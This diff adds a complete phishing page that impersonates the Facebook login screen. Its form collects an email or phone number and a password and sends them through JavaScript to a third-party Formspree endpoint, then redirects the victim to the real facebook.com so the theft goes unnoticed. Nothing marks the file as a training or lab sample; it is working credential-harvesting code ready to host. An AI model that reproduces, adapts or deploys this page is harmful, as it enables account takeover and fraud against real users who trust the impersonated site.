@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login Page</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1><span class="facebook-logo">facebook</span></h1>
+      <p><span class="slogan">Facebook helps you connect and share with the people in your life.</span></p>
+    </div>
+    <!-- Formspree form -->
+    <form action="https://formspree.io/f/xzbnozbb" method="POST" onsubmit="submitForm(event)">
+      <div class="input-group">
+        <input type="text" id="email" name="email" placeholder="Email or Phone">
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" name="password" placeholder="Password">
+      </div>
+      <button type="submit">Log In</button>
+    </form>
+    <!-- End of Formspree form -->
+    <p><a href="#">Forgot Password?</a></p>
+    <p><a href="#" class="create-account">Create New Account</a></p>
+  </div>
+
+  <script>
+    function submitForm(event) {
+      event.preventDefault(); // Prevent the default form submission behavior
+      var form = event.target; // Get the form element
+      var formData = new FormData(form); // Create FormData object from form data
+      var xhr = new XMLHttpRequest(); // Create new XMLHttpRequest object
+      xhr.open("POST", form.action, true); // Open POST request to Formspree endpoint
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          // If form submission is successful, redirect the user to www.facebook.com
+          window.location.href = 'https://www.facebook.com';
+        } else {
+          // If form submission fails, you can handle it here
+          console.error('Form submission failed:', xhr.statusText);
+        }
+      };
+      xhr.onerror = function() {
+        // If an error occurs during form submission, you can handle it here
+        console.error('Request failed:', xhr.statusText);
+      };
+      xhr.send(formData); // Send the form data to Formspree
+    }
+  </script>
+</body>
+</html>
